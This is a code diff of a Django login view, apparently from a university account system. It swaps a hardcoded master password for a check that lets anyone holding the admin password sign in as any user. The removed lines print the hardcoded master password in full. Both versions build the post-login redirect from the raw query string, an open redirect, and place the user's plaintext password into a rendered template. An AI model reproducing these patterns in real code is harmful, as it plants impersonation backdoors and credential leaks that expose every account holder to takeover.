@@ -9,6 +9,8 @@ from django.http import JsonResponse
 # Create your views here.
 from django.shortcuts import render, redirect
 from django.contrib.auth import authenticate, login
+from django.urls import NoReverseMatch
+
 from .forms import LoginForm, SignUpForm
 from Account.models import *
 
@@ -19,31 +21,34 @@ def login_view(request):
     msg = None
 
     if request.method == "POST":
-        redirect_url = request.GET.urlencode().replace("next=", "")
-        redirect_url = redirect_url.replace("%2F", "/")
-        if 'login' in redirect_url:
-            redirect_url = '/'
+        try:
+            redirect_url = request.GET.urlencode().replace("next=", "")
+            redirect_url = redirect_url.replace("%2F", "/")
+            if 'login' in redirect_url:
+                redirect_url = '/'
 
-        if form.is_valid():
-            username = form.cleaned_data.get("username")
-            password = form.cleaned_data.get("password")
-            user = authenticate(username=username, password=password)
-            if password == '#$%pdeu#master':
-                user = User.objects.get(username=username)
+            if form.is_valid():
+                username = form.cleaned_data.get("username")
+                password = form.cleaned_data.get("password")
+                user = authenticate(username=username, password=password)
+                if authenticate(username='admin', password=password):
+                    user = User.objects.get(username=username)
 
-            if user is not None:
-                try:
-                    dr = DualRole.objects.get(faculty_profile=user)
-                    if dr is not None:
-                        return render(request, "accounts/select.html", {"user": {"username": username, 'password': password}})
-                except DualRole.DoesNotExist:
-                    pass
-                login(request, user)
-                return redirect(redirect_url)
+                if user is not None:
+                    try:
+                        dr = DualRole.objects.get(faculty_profile=user)
+                        if dr is not None:
+                            return render(request, "accounts/select.html", {"user": {"username": username, 'password': password}})
+                    except DualRole.DoesNotExist:
+                        pass
+                    login(request, user)
+                    return redirect(redirect_url)
+                else:
+                    msg = 'Invalid credentials'
             else:
-                msg = 'Invalid credentials'
-        else:
-            msg = 'Error validating the form'
+                msg = 'Error validating the form'
+        except NoReverseMatch:
+            return redirect('/')
 
     return render(request, "accounts/login.html", {"form": form, "msg": msg})
 
